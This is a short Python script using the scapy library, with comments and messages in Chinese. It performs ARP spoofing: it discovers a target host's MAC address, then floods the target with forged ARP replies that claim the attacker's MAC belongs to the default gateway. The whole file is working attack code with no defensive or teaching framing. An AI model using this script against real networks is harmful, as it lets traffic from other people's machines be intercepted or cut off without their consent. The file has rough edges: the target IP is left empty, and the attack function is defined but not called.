import netifaces
import time
from scapy.all import sr1,ARP,ls,sendp,Ether
ip=''
global n,tgmac,smac,sip,tgip,a,gatewayip

def get_default_gateway_ip():
    gateways = netifaces.gateways()
    default_gateway = gateways['default'].get(netifaces.AF_INET, None)
    if default_gateway:
        return default_gateway[0]
    return None

gatewayip=get_default_gateway_ip()

def arp_scan(ip):#获取目的主机MAC地址
    global n,tgmac,smac,sip,tgip
    n=0
    arp_pack=ARP(pdst=ip)
    try:
        while(n<2):#确认主机存活的前提下 防止网络问题导致无法收到ARP响应报文
            ptk=sr1(arp_pack,timeout=5,verbose=False)
            n+=1
            if ptk:
                break
        if ptk.haslayer(ARP) and ptk:
            print(f'目的主机的ip为{ptk[ARP].psrc},MAC地址为{ptk[ARP].hwsrc}')
            print('可以开始arp毒化了！')
            print('--------------------------------------------------------------')
            tgmac=ptk[ARP].hwsrc
            smac=ptk[ARP].hwdst
            sip=ptk[ARP].pdst
            tgip=ptk[ARP].psrc
    except Exception as error:
        print('未收到ARP响应报文')
        print('错误信息为',error)
def arp_attack():
    global tgmac,smac,sip,tgip,a,gatewayip
    a=1
    try:
        while(a<=10000000000):
            a=a+1
            sendp(Ether(dst=tgmac,src=smac)/ARP(hwsrc=smac,psrc=gatewayip,hwdst=tgmac,pdst=tgip,op=2))#欺骗目的主机 网关的MAC地址为我们的地址
    except Exception as error:
        print(error)

arp_scan(ip)
